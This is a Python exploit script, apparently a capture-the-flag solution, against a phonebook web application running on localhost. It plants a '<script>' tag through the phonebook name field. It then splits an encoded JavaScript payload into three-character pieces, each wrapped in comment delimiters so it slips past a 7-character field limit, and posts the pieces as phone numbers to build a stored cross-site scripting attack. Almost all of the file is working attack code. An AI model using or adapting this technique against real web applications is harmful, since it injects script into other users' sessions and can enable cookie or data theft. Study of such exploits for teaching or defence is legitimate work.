import encoder
import requests

URL = 'http://localhost:8000'
sess = requests.Session()

def split_payload(raw):
    parts = []

    i = 0
    while i < len(raw):
        c = raw[i]

        if c.isdigit() and raw[i+1].isdigit():
            c += raw[i+1]
            i += 2
        elif c == "'" or c == "/" or (c == '1' and raw[i+1] == '/'):
            if c == "'" and raw[i+1] == "'":
                c += raw[i+1]
                i += 2
            else:
                c += raw[i+1] + raw[i+2]
                i += 3
        else:
            i += 1

        parts.append(c)

    max_parts = []
    buf = ""

    i = 0
    while i < len(parts):
        if len(buf + parts[i]) <= 3:
            buf += parts[i]
        else:
            max_parts.append(buf)
            buf = parts[i]
        i += 1

    max_parts.append(buf)
    return max_parts

# First we insert a <script> tag
pbid = sess.post(URL + '/api/phonebook', json={'pbname': '<script>/*'}).json()
print(pbid)

# TODO: replace this with a not alert(1) payload

# Generate a payload with the encodes, applying rules to make sure we don't split up useful chunks
#  e.g. we want 'a' to remain as 'a' and not be changed to 'a/*...*/'

raw_payload = encoder.encode_runnable('n(c)');
print(raw_payload)

# We have a 7 char allocation per payload piece - we spend 4 of these on the start and end comments
# meaning that we only have 3 chars to play around with. Luckily our largest important group is of length 3

payload = split_payload(raw_payload + ';')
print(len(payload))

for i, segment in enumerate(payload):
    #print(i, len(payload))
    sess.post(URL + '/api/phonebook/' + str(pbid), json={'phonenumber': '*/' + segment + '/*', 'numberowner': 'a'})

sess.post(URL + '/api/phonebook/' + str(pbid), json={'phonenumber': '*//*', 'numberowner': 'a'})

print(sess.cookies)
